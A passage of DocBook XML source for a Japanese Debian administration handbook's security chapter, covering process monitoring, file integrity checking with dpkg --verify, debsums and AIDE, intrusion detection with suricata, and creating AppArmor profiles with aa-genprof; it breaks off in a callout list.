	<para><command>top</command> は現在実行中のプロセスのリストを表示する対話型ツールです。デフォルトでは現在のプロセッサ使用量に基づいてソートされ、<keycap>P</keycap> キーを押すことで内容を更新することが可能です。他のソート基準として、専有メモリ量 (<keycap>M</keycap> キー)、総プロセッサ時間 (<keycap>T</keycap> キー)、プロセス ID (<keycap>N</keycap> キー) などがあります。<keycap>k</keycap> キーに続けてプロセス ID を入力することで、識別子に対応するプロセスを殺すことが可能です。<keycap>r</keycap> キーを使ってプロセスの <emphasis>renicing</emphasis> を行うことが可能です、つまり優先度を変更することが可能です。</para>
        <indexterm><primary><command>top</command></primary></indexterm>

	<para>システムの負荷が高過ぎる場合、<command>top</command> はプロセッサ時間を奪っていたりメモリを大量に消費しているプロセスを調査する素晴らしいツールになります。特に、リソースを消費しているプロセスがそのマシンでホストされる本物のサービスにふさわしいものであるか否かを確認することは興味深い作業と言えます。www-data ユーザとして実行されている不明なプロセスは特に警戒して調査するべきです。なぜなら、その不明なプロセスはウェブアプリケーションの脆弱性を利用してシステムにインストールおよび実行されたソフトウェアのインスタンスかもしれないからです。</para>

	<para><command>top</command> はとても柔軟性の高いツールで、<command>top</command> のマニュアルページでは表示をカスタマイズする方法とそのカスタマイズの結果を個人的なニーズや習慣に反映させる方法が詳細に説明されています。</para>

        <para><command>gnome-system-monitor</command> グラフィカルツールは <command>top</command> とよく似ており、大ざっぱに言って <command>top</command> と同じ機能を備えています。</para>

        <indexterm><primary><command>gnome-system-monitor</command></primary></indexterm>
      </section>
      <section id="sect.monitoring-history">
        <title>履歴</title>
        <indexterm><primary>活動、履歴</primary></indexterm>

	<para>プロセッサの負荷、ネットワークトラフィック、空きディスク領域などの情報は絶えず変化します。これらの情報の経時変化を保存しておけば、コンピュータの使われ方を明らかにする際に役立ちます。</para>
        <indexterm><primary>SNMP</primary></indexterm>
        <indexterm><primary>Simple Network Management Protocol</primary></indexterm>

	<para>時間変化する情報の保存には専用のツールがたくさんあります。多くのツールは、この種の情報を一元管理するために、SNMP (<emphasis>Simple Network Management Protocol</emphasis>) を介してデータを取得します。SNMP を使うことで、汎用的なコンピュータを除くネットワーク要素 (たとえば専用ネットワークルータやスイッチ) からデータを取得することが可能になるという恩恵があります。</para>

	<para>本書では、<xref linkend="advanced-administration" xrefstyle="select: label quotedtitle" />の中で Munin が詳細に取り上げられています (<xref linkend="sect.munin" />を参照してください)。さらに Debian には類似のツールである <emphasis role="pkg">cacti</emphasis> が含まれます。cacti の配備は Munin よりも少し複雑です。なぜなら cacti は SNMP だけに基づいているからです。cacti にはウェブインターフェースが用意されていますが、設定に必要な概念を理解するには少し努力が必要です。事前に HTML 文書 (<filename>/usr/share/doc/cacti/html/index.html</filename>) を読んでおくことを推奨します。</para>

        <sidebar>
          <title><emphasis>ALTERNATIVE</emphasis> <command>mrtg</command></title>
          <indexterm><primary><command>mrtg</command></primary></indexterm>

	  <para><command>mrtg</command> (同名のパッケージに含まれます) は古いツールです。荒削りな面もありますが、<command>mrtg</command> は時系列データを集計し、これをグラフとして表示することが可能です。<command>mrtg</command> は最も一般的に監視されるデータ (たとえばプロセッサの負荷、ネットワークトラフィック、ウェブページのヒットなどの情報) を収集する多数の専用スクリプトを備えています。</para>

	  <para><emphasis role="pkg">mrtg-contrib</emphasis> と <emphasis role="pkg">mrtgutils</emphasis> パッケージには、直接使うことができるスクリプトの例が含まれます。</para>
        </sidebar>
      </section>
    </section>
    <section>
      <title>変更検出</title>

      <para>システムのインストールと設定が完了したら、セキュリティアップグレードを行わない限りデータ以外のほとんどのファイルとディレクトリが変化する理由はありません。このため、ファイルが変化していないことを確認することは興味深いです。すなわち、ファイルに対する予想外の変化は調査に値します。この節では、ファイルに対する予想外の変化に備えて、ファイルを監視して管理者に警告する (または単純に変更をリストする) いくつかのツールを紹介します。</para>
      <section id="sect.dpkg-verify">
        <title><command>dpkg --verify</command> を使ったパッケージ監視</title>
        <indexterm><primary><command>dpkg</command></primary><secondary><command>dpkg --verify</command></secondary></indexterm>
        <sidebar>
          <title><emphasis>GOING FURTHER</emphasis> Debian 並びにソフトウェア開発元に対する攻撃から手元のシステムを守る</title>

	  <para>Debian パッケージの提供するファイルに対する変化を検出する場合には <command>dpkg --verify</command> は役に立ちますが、たとえば Debian アーカイブミラーが不正アクセスを受けたことによりパッケージ自体が不正に改竄された場合には <command>dpkg --verify</command> は役に立ちません。この種の攻撃に対向するには、APT のデジタル署名照合システムを使い (<xref linkend="sect.package-authentication" />を参照してください)、認証された発行元からのパッケージだけをインストールするように気を付けることが必要です。</para>
        </sidebar>

        <para><command>dpkg --verify</command> (または <command>dpkg -V</command>) は興味深いツールで、(潜在的には攻撃者によって) 変更を加えられたインストール済みファイルを見つけることが可能です。しかしながら、<command>dpkg --verify</command> の結果は疑ってかかるべきです。なぜなら <command>dpkg --verify</command> は変更されたファイルを検出するために dpkg 自身のデータベースに保存されたチェックサムを使っており、このデータベースはハードディスク上 (<filename>/var/lib/dpkg/info/<replaceable>package</replaceable>.md5sums</filename>) に保存されているからです。このため、完璧主義の攻撃者なら改竄したファイルに対応する新しいチェックサムを使ってデータベースファイルを更新するでしょう。</para>

        <sidebar>
          <title><emphasis>BACK TO BASICS</emphasis> ファイルの指紋</title>
	  <indexterm><primary>指紋</primary></indexterm>
	  <indexterm><primary>コントロールサム</primary></indexterm>
	  <indexterm><primary>MD5</primary></indexterm>
	  <indexterm><primary>SHA1</primary></indexterm> 
          <para>備忘録的になりますが、ここで指紋とはファイルの内容に対するある種の署名を含む値です (通常は 16 進数で表記された数です)。この署名はあるアルゴリズムを使って計算されます。指紋計算に使われるアルゴリズムはファイルに対して行われた小さな変化により指紋が変化することがおおよそ保証されているアルゴリズムです (MD5 や SHA1 がよく知られているアルゴリズムです)。そしてこの特徴は「アバランシェ効果」として知られています。アバランシェ効果のおかげで、簡単な数字で表される指紋がファイルの内容の変化を検出するためのリトマス試験として機能することになります。指紋計算に使われるアルゴリズムは不可逆です。言い換えれば、ほとんどの指紋計算アルゴリズムに対して指紋からその指紋が得られる内容を発見することは不可能であることが知られています。最近の数学的な進歩により、アルゴリズムの原理の絶対性が揺らいでいるように見えます。しかしこれはアルゴリズムを使うことに対して疑問を投げかけるものではありません。なぜなら、同じ指紋を持つ異なる内容を作成することはまだかなり難しい作業だからです。</para>
        </sidebar>

        <para><command>dpkg -V</command> を実行すると、すべてのインストール済みパッケージが検証され、テストに失敗したファイルが行ごとに表示されます。出力フォーマットは <command>rpm -V</command> が採用しているフォーマットと同じで、行頭の各文字は特定のメタデータに対するテストの結果を意味しています。残念なことに <command>dpkg</command> は多くのテストに必要なメタデータを保存しません。これらのメタデータを必要とするテストの結果は常に疑問符が出力されることになります。今のところ実行できるテストはチェックサムテストだけで、チェックサムテストに失敗した場合、左から 3 番目の文字が「5」になります。</para>
        <screen>
<computeroutput># </computeroutput><userinput>dpkg -V</userinput>
<computeroutput>??5??????   /lib/systemd/system/ssh.service
??5?????? c /etc/libvirt/qemu/networks/default.xml
??5?????? c /etc/lvm/lvm.conf
??5?????? c /etc/salt/roster</computeroutput></screen>
        <para>上の例では、dpkg は Debian パッケージから提供された SSH の service ファイルが直接編集されていることを報告しています。一般に管理者は Debian パッケージから提供された設定ファイル以外のファイルを直接編集するべきではありません。今回の場合ならば、改めて <filename>/etc/systemd/system/ssh.service</filename> を作成し、これを編集するべきです (このファイルは一般に設定変更を配置すべき場所である <filename>/etc</filename> ディレクトリの下に配置されます)。さらに、dpkg は設定ファイルとみなされた複数のファイルが修正されていることを報告しています (この場合、左から 2 番目のフィールドが「c」という文字になります)。設定ファイルに対する修正は合法的と言えます。</para>
      </section>

      <section id="sect.debsums">
        <title>パッケージの監査、<command>debsums</command> とその限界</title>
        <indexterm><primary><command>debsums</command></primary></indexterm>

        <para><command>debsums</command> は <command>dpkg -V</command> の祖先です。このため、<command>debsums</command> はほとんど使われていません。<command>debsums</command> と dpkg は同じ制限に悩まされています。幸いなことに、<command>debsums</command> はいくつかの制限を回避することが可能です (一方で dpkg には同様の回避策がありません)。</para>

        <para>ディスク上のデータは信頼できないため、<command>debsums</command> は dpkg データベースではなく <filename>.deb</filename> ファイルに基づいてテストを行う機能を提供しています。すべてのインストール済みパッケージに対応する信頼できる <filename>.deb</filename> ファイルをダウンロードするには、APT の認証付きダウンロード機構を使います。この操作は遅くて退屈ですから、この操作を定期的かつ積極的に使う手法として考えるべきではありません。</para>

        <screen>
<computeroutput># </computeroutput><userinput>apt-get --reinstall -d install `grep-status -e 'Status: install ok installed' -n -s Package`</userinput>
<computeroutput>[ ... ]
# </computeroutput><userinput>debsums -p /var/cache/apt/archives --generate=all</userinput></screen>

	<para>この例の中で、デフォルトではインストールされない <emphasis role="pkg">dctrl-tools</emphasis> パッケージに含まれる <command>grep-status</command> コマンドが使われている点に注意してください。</para>
      </section>
      <section>
        <title>ファイル監視、AIDE</title>
        <indexterm><primary><emphasis role="pkg">aide</emphasis> (Debian パッケージ)</primary></indexterm>

	<para>AIDE ツール (<emphasis>Advanced Intrusion Detection Environment</emphasis>、<emphasis role="pkg">aide</emphasis> パッケージに含まれます) を使うことで、ファイルの完全性を確認したり、事前に保存された正当なシステムのイメージに対する変更を検出したりすることが可能です。このイメージはシステムのすべてのファイルに対して関連する情報 (指紋、パーミッション、タイムスタンプなど) を記録するデータベース (<filename>/var/lib/aide/aide.db</filename>) に保存されます。このデータベースは最初に <command>aideinit</command> を使って初期化されます。そして毎日、関係のある情報が何も変更されていないことを確認するために、このデータベースは <filename>/etc/cron.daily/aide</filename> スクリプトから使われます。変更が検出されたら、AIDE は変更内容をログファイル (<filename>/var/log/aide/*.log</filename>) に記録し、検出された変更内容を管理者にメールで送信します。</para>

        <sidebar>
          <title><emphasis>IN PRACTICE</emphasis> データベースの保護</title>

	  <para>AIDE はファイルの状態を比較するためにローカルデータベースを使います。結果の信頼性は直接的にデータベースの信頼性と結び付いています。攻撃者が不正アクセスされたシステムの root 権限を取得した場合、攻撃者はデータベースを置き換えて自分の行動の形跡を隠すことが可能です。可能な次善策は参照データを読み込み専用のストレージメディアに保存することです。</para>
        </sidebar>

	<para><filename>/etc/default/aide</filename> に含まれる多くのオプションを使って <emphasis role="pkg">aide</emphasis> パッケージの挙動を微調整します。AIDE 設定は <filename>/etc/aide/aide.conf</filename> と <filename>/etc/aide/aide.conf.d/</filename> に保存されています (実質的に言えば、これらのファイルは <command>update-aide.conf</command> が <filename>/var/lib/aide/aide.conf.autogenerated</filename> を生成するためだけに使われます)。設定は確認する必要のあるファイルの属性の種類を指定します。たとえば、ログファアイルの内容は定期的に変わりますが、この種の変更はファイルのパーミッションが同じなら無視することが可能です。しかし、実行プログラムの内容とパーミッションの両方は必ず同じでなければいけません。設定の構文は、とても複雑というわけではありませんが、十分に直感的というわけでもありません。<citerefentry><refentrytitle>aide.conf</refentrytitle> <manvolnum>5</manvolnum></citerefentry> マニュアルページを読むことを推奨します。</para>

	<para>データベースの新しいバージョンは毎日生成され、<filename>/var/lib/aide/aide.db.new</filename> に保存されます。そして、すべての記録された変更が正当ならば、参照データベースを新しいデータベースに置き換えることが可能です。</para>

        <sidebar>
          <title><emphasis>ALTERNATIVE</emphasis> Tripwire と Samhain</title>

	  <para>Tripwire は AIDE とよく似ており、Tripwire の設定ファイルの構文も AIDE の設定ファイルの構文とほとんど同じです。AIDE に対する <emphasis role="pkg">tripwire</emphasis> の主な追加点は <emphasis role="pkg">tripwire</emphasis> には設定ファイルを署名するメカニズムが追加されている点です。設定ファイルを署名することで、参照データベースの示す先を異なるバージョンに差し替えることが不可能になります。</para>

	  <para>Samhain も類似の機能を提供しますが、Samhain は rootkit の検出に役立ついくつかの機能を備えています (補注<xref linkend="sidebar.the-checksecurity-and-chkrootkit-rkhunter-packages" />を参照してください)。Samhain はネットワークを使って広範囲に配備され、中央サーバ上に履歴を (署名と一緒に) 記録することが可能です。</para>
        </sidebar>

        <sidebar id="sidebar.the-checksecurity-and-chkrootkit-rkhunter-packages">
          <title><emphasis>QUICK LOOK</emphasis> <emphasis role="pkg">checksecurity</emphasis> と <emphasis role="pkg">chkrootkit</emphasis>/<emphasis role="pkg">rkhunter</emphasis> パッケージ</title>
          <indexterm><primary><emphasis role="pkg">checksecurity</emphasis></primary></indexterm>

	  <para><emphasis role="pkg">checksecurity</emphasis> パッケージには、システムの基本的な確認項目 (空のパスワード、新しい setuid ファイルなど) について確認を行い、必要ならば管理者に警告するための、複数の小さなスクリプトが含まれます。checksecurity という明快な名前にも関わらず、管理者が Linux システムが安全であることを保証するためには checksecurity だけでは不十分です。</para>

	  <para><emphasis role="pkg">chkrootkit</emphasis> と <emphasis role="pkg">rkhunter</emphasis> パッケージを使うことで、システムに潜在的にインストールされた <emphasis>rootkit</emphasis> を探し出すことが可能です。備忘録的になりますが、<emphasis>rootkit</emphasis> はシステムの不正侵入を隠すために設計されたソフトウェアで、マシンをこっそりと操作できる状態にし続けます。<emphasis role="pkg">chkrootkit</emphasis> と <emphasis role="pkg">rkhunter</emphasis> パッケージを使ったテストは 100% 信頼できるものではありませんが、管理者はテストにより潜在的な問題に対して注意を払うようになります。</para>
        </sidebar>
      </section>
    </section>
    <section id="sect.intrusion-detection">
      <title>侵入検知 (IDS/NIDS)</title>
      <indexterm><primary>検知、侵入</primary></indexterm>
      <indexterm><primary>侵入検知</primary></indexterm>
      <indexterm><primary>IDS</primary></indexterm>
      <indexterm><primary>侵入検知システム</primary></indexterm>
      <indexterm><primary>NIDS</primary></indexterm>
      <indexterm><primary>ネットワーク</primary><secondary>IDS</secondary></indexterm>

      <sidebar>
        <title><emphasis>BACK TO BASICS</emphasis> サービス妨害</title>
        <indexterm><primary>サービス妨害</primary></indexterm>

	<para>「サービス妨害」攻撃の目的は 1 つしかありません。すなわち、サービスを使用不能にすることです。「サービス妨害」攻撃は問い合わせを使ってサーバに大きな負荷を加えたり、バグを不正に活用したりすることで実行されますが、どんな方法で実行されても最終結果は同じです。すなわち、サービスがもはや使用できなくなります。正規のユーザは迷惑しますし、標的にされたネットワークサービスをホストしている事業者の評価が落ちます (たとえばサービスが電子商取引サイトの場合、収入も落ちます)。</para>

	<para>「サービス妨害」攻撃はしばしば「分散」されることがあります。通常の「分散」された攻撃は数多くの異なる送信元から数多くの問い合わせを送信することにより、サーバに負荷を加えます。こうすることで、サーバは正規の問い合わせに応答できなくなります。この種の攻撃には、よく知られている頭字語が与えられています。具体的に言えば、<acronym>DDoS</acronym> と <acronym>DoS</acronym> です (サービス妨害攻撃が分散型か否かで区別します)。</para>
      </sidebar>

      <para><command>suricata</command> (同名の Debian パッケージに含まれます) は NIDS すなわち<emphasis>ネットワーク型侵入検知システム</emphasis>です。NIDS の機能はネットワークをリッスンして侵入試行および敵対行為 (サービス妨害攻撃も含まれます) を検出しようとします。すべてのイベントは <filename>/var/log/suricata</filename> 内の複数のファイルに記録されます。収集されたすべてのデータを閲覧するためのサードパーティツール (Kibana/logstash) が存在します。<ulink type="block" url="http://suricata-ids.org" /><ulink type="block" url="https://www.elastic.co/products/kibana" /></para>
      <indexterm><primary><command>snort</command></primary></indexterm>
      <indexterm><primary><command>suricata</command></primary></indexterm>

      <sidebar>
        <title><emphasis>CAUTION</emphasis> 動作範囲</title>

	<para><command>suricata</command> の有効性は監視対象のネットワークインターフェース上を流れるトラフィックによって制限されます。<command>suricata</command> が真のトラフィックを観察することができない場合、当然ながら <command>suricata</command> は何も検出しません。<command>suricata</command> が実行されているマシンをネットワークスイッチに接続した場合、<command>suricata</command> が実行されているマシンを対象にした攻撃だけを検出することが可能です。この挙動は意図するものではないかもしれません。このため <command>suricata</command> が実行されているマシンはネットワークスイッチの「ミラー」ポートに接続されるべきです。通常「ミラー」ポートはスイッチをカスケード接続するために使われるため、すべてのトラフィックを取得することが可能です。</para>
      </sidebar>

      <para>suricata を設定するには <filename>/etc/suricata/suricata-debian.yaml</filename> をよく読んで編集します。それぞれのパラメータはこのファイルの中で詳細に説明されているため、このファイルはとても長いものです。最低限の設定を行うには、<literal>HOME_NET</literal> パラメータでローカルネットワークのカバーするアドレス範囲を指定する必要があります。実際のところ <literal>HOME_NET</literal> パラメータは潜在的に攻撃される可能性を持つすべてのネットワークを意味しています。しかし設定パラメータのほとんどを理解するには、パラメータの説明をすべて読み、パラメータをそれぞれの状況に適応させることが必要です。</para>
      <para>加えて、監視対象のネットワークインターフェースを定義して init スクリプトを有効化する (<literal>RUN=yes</literal> と設定する) ために、<filename>/etc/default/suricata</filename> を編集するべきです。また、管理者は <literal>LISTENMODE=pcap</literal> のように設定したいと思うかもしれません。なぜなら、デフォルト設定である <literal>LISTENMODE=nfqueue</literal> を適切に動かすためには、さらに設定を行う必要があるからです (netfilter ファイアウォールの <literal>NFQUEUE</literal> 動作を使って suricata が取り扱う一部のユーザ空間キュー宛のパケットを通過するように、ファイアウォールを設定しなければいけません)。</para>
      <para>不正行為を検出するためには、<command>suricata</command> に一連の監視規則を設定する必要があります。いくつかの監視規則は <emphasis role="pkg">snort-rules-default</emphasis> パッケージに含まれています。<command>snort</command> は IDS エコシステムにおける歴史的な基準ソフトウェアで、<command>suricata</command> は <command>snort</command> 向けに書かれた監視規則を再利用することが可能です。残念なことに <emphasis role="pkg">snort-rules-default</emphasis> パッケージは <emphasis role="distribution">Debian Jessie</emphasis> には含まれません。このため、<emphasis role="pkg">snort-rules-default</emphasis> パッケージを入手するには<emphasis role="distribution">テスト版</emphasis>か<emphasis role="distribution">不安定版</emphasis>などの他の Debian リリースを使ってください。</para>
      <para>代案として、<command>oinkmaster</command> (同名のパッケージに含まれます) を使って外部ソースから Snort の監視規則をダウンロードすることも可能です。</para>
      <sidebar>
        <title><emphasis>GOING FURTHER</emphasis> <command>prelude</command> との統合</title>

	<para>prelude を使うことでセキュリティ情報の中央集中型監視が可能になります。prelude のモジュール式設計には、サーバ (<emphasis role="pkg">prelude-manager</emphasis> に含まれる<emphasis>マネージャ</emphasis>) が含まれ、サーバはさまざまな種類の<emphasis>センサー</emphasis>によって生成された警告を収集します。</para>

	<para>Suricata を prelude のセンサーとして設定することが可能です。他の可能性には <emphasis>prelude-lml</emphasis> (<emphasis>Log Monitor Lackey</emphasis>) があります。これは (<xref linkend="sect.logcheck" />で説明されている <command>logcheck</command> と同様のやり方で) ログファイルを監視します。</para>
        <indexterm><primary><command>prelude</command></primary></indexterm>
      </sidebar>
    </section>
  </section>
  <section id="sect.apparmor">
    <title>AppArmor の紹介</title>
    <indexterm><primary>AppArmor</primary></indexterm>
    <section id="sect.apparmor-principles">
      <title>原理</title>
      <para>AppArmor は Linux の LSM (<emphasis>Linux Security Modules</emphasis>) インターフェース上に設けられた<emphasis>強制アクセス制御</emphasis> (MAC) システムです。具体的に言えば、カーネルはそれぞれのシステムコールの前にシステムコールを発行したプロセスが指定された操作に対する権限を与えられているか AppArmor に問い合わせます。このメカニズムを通じて、AppArmor はプログラムがアクセスできるリソースを制限します。</para>
      <indexterm><primary><emphasis>強制アクセス制御</emphasis></primary></indexterm>
      <indexterm><primary><emphasis>Linux Security Modules</emphasis></primary></indexterm>
      <para>AppArmor はプログラムごとに一連の規則 (これは「プロファイル」として知られています) を適用します。カーネルは実行されたプログラムのインストール先のパスに依存してこのプロファイルを適用します。SELinux とは対照的に (<xref linkend="sect.selinux" />を参照してください)、このプロファイルはユーザに依存するものではありません。同じプログラムを実行したすべてのユーザは同じプロファイルを適用されます (しかしながら、伝統的なユーザパーミッションが適用されないわけではありません。このため、ユーザごとにプログラムの挙動が異なる可能性もあります!)。</para>
      <para>AppArmor プロファイルは <filename>/etc/apparmor.d/</filename> に保存され、プロファイルには各プログラムが使うことができるリソースに対するアクセス制御規則のリストが含まれています。プロファイルは <command>apparmor_parser</command> コマンドによってコンパイルされてカーネルに読み込まれます。各プロファイルは enforce または complain モードで読み込みます。enforce モードではポリシーの遵守を強制され、ポリシー違反の試行を報告されます。これに対して、complain モードではポリシーの遵守を強制されませんが、ポリシー違反で拒否されうるシステムコールを記録されます。</para>
    </section>
    <section id="sect.apparmor-setup">
      <title>AppArmor の有効化と AppArmor プロファイルの管理</title>
      <para>AppArmor のサポートは Debian が提供する標準カーネルに組み込まれています。このため AppArmor を有効化するには、いくつかのパッケージをインストールして、一部のパラメータをカーネルコマンドラインに追加します。</para>
      <screen><computeroutput># </computeroutput><userinput>apt install apparmor apparmor-profiles apparmor-utils
</userinput><computeroutput>[...]
# </computeroutput><userinput>perl -pi -e 's,GRUB_CMDLINE_LINUX="(.*)"$,GRUB_CMDLINE_LINUX="$1 apparmor=1 security=apparmor",' /etc/default/grub
</userinput><computeroutput># </computeroutput><userinput>update-grub
</userinput></screen>
      <para>AppArmor は再起動後に動作します。以下に示す通り <command>aa-status</command> を使えば AppArmor の有効化を素早く確認できます。</para>
      <screen>
<computeroutput># </computeroutput><userinput>aa-status</userinput>
<computeroutput>apparmor module is loaded.
44 profiles are loaded.
9 profiles are in enforce mode.
   /usr/bin/lxc-start
   /usr/lib/chromium-browser/chromium-browser//browser_java
[...]
35 profiles are in complain mode.
   /sbin/klogd
[...]
3 processes have profiles defined.
1 processes are in enforce mode.
   /usr/sbin/libvirtd (1295) 
2 processes are in complain mode.
   /usr/sbin/avahi-daemon (941) 
   /usr/sbin/avahi-daemon (1000) 
0 processes are unconfined but have a profile defined.</computeroutput></screen>
      <sidebar>
        <title><emphasis>NOTE</emphasis> さらに多くの AppArmor プロファイル</title>
        <para><emphasis role="pkg">apparmor-profiles</emphasis> パッケージには上流 AppArmor コミュニティによって管理されているプロファイルが含まれます。さらに多くのプロファイルを入手するには Ubuntu と Debian によって開発されているプロファイルが含まれる <emphasis role="pkg">apparmor-profiles-extra</emphasis> をインストールしてください。</para>
      </sidebar>
      <para>それぞれのプロファイルの状態を enforce または complain モードに切り替えるには、引数に実行ファイルのパスかポリシーファイルのパスを与えて <command>aa-enforce</command> または <command>aa-complain</command> を呼び出します。さらにプロファイルを完全に無効化するには、<command>aa-disable</command> を使うか <command>aa-audit</command> を使ってプロファイルを audit モード (承認されたシステムコールもログ記録するモード) に切り替えます。</para>
      <screen>
<computeroutput># </computeroutput><userinput>aa-enforce /usr/sbin/avahi-daemon</userinput>
<computeroutput>Setting /usr/sbin/avahi-daemon to enforce mode.</computeroutput>
<computeroutput># </computeroutput><userinput>aa-complain /etc/apparmor.d/usr.bin.lxc-start</userinput>
<computeroutput>Setting /etc/apparmor.d/usr.bin.lxc-start to complain mode.</computeroutput>
      </screen>
    </section>
    <section id="sect.apparmor-new-profile">
      <title>新規プロファイルの作成</title>
      <para>AppArmor プロファイルを作成することはかなり簡単な作業であるにも関わらず、多くのプログラムがプロファイルを用意していません。この節では、対象のプログラムを使いながら AppArmor に対象のプログラムが呼び出したシステムコールとアクセスするリソースを監視させることにより、ゼロから新しいプロファイルを作成する方法を示します。</para>
      <para>アクセス制限を設ける必要のある最も重要なプログラムはネットワークを取り扱うプログラムです。なぜなら、この種のプログラムは遠隔攻撃者からの標的になるからです。このため好都合なことに AppArmor には <command>aa-unconfined</command> コマンドが用意されています。<command>aa-unconfined</command> コマンドは関連するプロファイルが存在せず開かれたネットワークソケットを公開しているプログラムを表示します。<command>aa-unconfined</command> に <literal>--paranoid</literal> オプションを付けて実行すれば、少なくとも 1 つ以上のアクティブなネットワーク接続を持つアクセス制限を設けていないプロセスがすべて表示されます。</para>
      <screen>
<computeroutput># </computeroutput><userinput>aa-unconfined</userinput>
<computeroutput>801 /sbin/dhclient not confined
890 /sbin/rpcbind not confined
899 /sbin/rpc.statd not confined
929 /usr/sbin/sshd not confined
941 /usr/sbin/avahi-daemon confined by '/usr/sbin/avahi-daemon (complain)'
988 /usr/sbin/minissdpd not confined
1276 /usr/sbin/exim4 not confined
1485 /usr/lib/erlang/erts-6.2/bin/epmd not confined
1751 /usr/lib/erlang/erts-6.2/bin/beam.smp not confined
19592 /usr/lib/dleyna-renderer/dleyna-renderer-service not confined</computeroutput>
      </screen>
      <para>以下の例では、<command>/sbin/dhclient</command> 用のプロファイルを作成しようとしています。プロファイルを作成するためには <command>aa-genprof dhclient</command> を使います。<command>aa-genprof</command> はユーザに別のウィンドウから対象のアプリケーションを開始することを求め、その後ユーザにシステムログ内の AppArmor イベントをスキャンしてこれらのログをアクセス規則に変換するために <command>aa-genprof</command> に戻ることを求めます。ログ記録されたそれぞれのイベントについて、<command>aa-genprof</command> は 1 つ以上の規則を提案します。ユーザは提案された規則を受け入れるかまたはさまざまな方法で規則を編集することが可能です。</para>
      <screen>
<computeroutput># </computeroutput><userinput>aa-genprof dhclient</userinput>
<computeroutput>Writing updated profile for /sbin/dhclient.
Setting /sbin/dhclient to complain mode.

Before you begin, you may wish to check if a
profile already exists for the application you
wish to confine. See the following wiki page for
more information:
http://wiki.apparmor.net/index.php/Profiles

Please start the application to be profiled in
another window and exercise its functionality now.

Once completed, select the "Scan" option below in 
order to scan the system logs for AppArmor events. 

For each AppArmor event, you will be given the 
opportunity to choose whether the access should be 
allowed or denied.

Profiling: /sbin/dhclient

[(S)can system log for AppArmor events] / (F)inish
Reading log entries from /var/log/audit/audit.log.

Profile:  /sbin/dhclient <co id="aa-genprof-execute"></co>
Execute:  /usr/lib/NetworkManager/nm-dhcp-helper
Severity: unknown

(I)nherit / (C)hild / (P)rofile / (N)amed / (U)nconfined / (X) ix On / (D)eny / Abo(r)t / (F)inish
<userinput>P</userinput>
Should AppArmor sanitise the environment when
switching profiles?

Sanitising environment is more secure,
but some applications depend on the presence
of LD_PRELOAD or LD_LIBRARY_PATH.

(Y)es / [(N)o]
<userinput>Y</userinput>
Writing updated profile for /usr/lib/NetworkManager/nm-dhcp-helper.
Complain-mode changes:
WARN: unknown capability: CAP_net_raw

Profile:    /sbin/dhclient <co id="aa-genprof-capability"></co>
Capability: net_raw
Severity:   unknown

[(A)llow] / (D)eny / (I)gnore / Audi(t) / Abo(r)t / (F)inish
<userinput>A</userinput>
Adding capability net_raw to profile.

Profile:  /sbin/dhclient <co id="aa-genprof-read"></co>
Path:     /etc/nsswitch.conf
Mode:     r
Severity: unknown

  1 - #include &lt;abstractions/apache2-common&gt; 
  2 - #include &lt;abstractions/libvirt-qemu&gt; 
  3 - #include &lt;abstractions/nameservice&gt; 
  4 - #include &lt;abstractions/totem&gt; 
 [5 - /etc/nsswitch.conf]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>3</userinput>

Profile:  /sbin/dhclient
Path:     /etc/nsswitch.conf
Mode:     r
Severity: unknown

  1 - #include &lt;abstractions/apache2-common&gt; 
  2 - #include &lt;abstractions/libvirt-qemu&gt; 
 [3 - #include &lt;abstractions/nameservice&gt;]
  4 - #include &lt;abstractions/totem&gt; 
  5 - /etc/nsswitch.conf 
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>A</userinput>
Adding #include &lt;abstractions/nameservice&gt; to profile.

Profile:  /sbin/dhclient
Path:     /proc/7252/net/dev
Mode:     r
Severity: 6

  1 - /proc/7252/net/dev 
 [2 - /proc/*/net/dev]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>A</userinput>
Adding /proc/*/net/dev r to profile

[...]
Profile:  /sbin/dhclient <co id="aa-genprof-write"></co>
Path:     /run/dhclient-eth0.pid
Mode:     w
Severity: unknown

 [1 - /run/dhclient-eth0.pid]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>N</userinput>

Enter new path: /run/dhclient*.pid

Profile:  /sbin/dhclient
Path:     /run/dhclient-eth0.pid
Mode:     w
Severity: unknown

  1 - /run/dhclient-eth0.pid 
 [2 - /run/dhclient*.pid]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>A</userinput>
Adding /run/dhclient*.pid w to profile

[...]
Profile:  /usr/lib/NetworkManager/nm-dhcp-helper <co id="aa-genprof-other-profile"></co>
Path:     /proc/filesystems
Mode:     r
Severity: 6

 [1 - /proc/filesystems]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>A</userinput>
Adding /proc/filesystems r to profile

= Changed Local Profiles =

The following local profiles were changed. Would you like to save them?

 [1 - /sbin/dhclient]
  2 - /usr/lib/NetworkManager/nm-dhcp-helper 
(S)ave Changes / Save Selec(t)ed Profile / [(V)iew Changes] / View Changes b/w (C)lean profiles / Abo(r)t
<userinput>S</userinput>
Writing updated profile for /sbin/dhclient.
Writing updated profile for /usr/lib/NetworkManager/nm-dhcp-helper.

Profiling: /sbin/dhclient

[(S)can system log for AppArmor events] / (F)inish
<userinput>F</userinput>
Setting /sbin/dhclient to enforce mode.
Setting /usr/lib/NetworkManager/nm-dhcp-helper to enforce mode.

Reloaded AppArmor profiles in enforce mode.

Please consider contributing your new profile!
See the following wiki page for more information:
http://wiki.apparmor.net/index.php/Profiles

Finished generating profile for /sbin/dhclient.</computeroutput></screen>
      <para><command>aa-genprof</command> プログラムはユーザが入力した操作文字を再表示しないという点に注意してください。しかし、上に挙げた例では説明を明確に行うために、ユーザが入力した操作文字をその直後に表記しています。</para>
      <calloutlist>
        <callout arearefs="aa-genprof-execute">
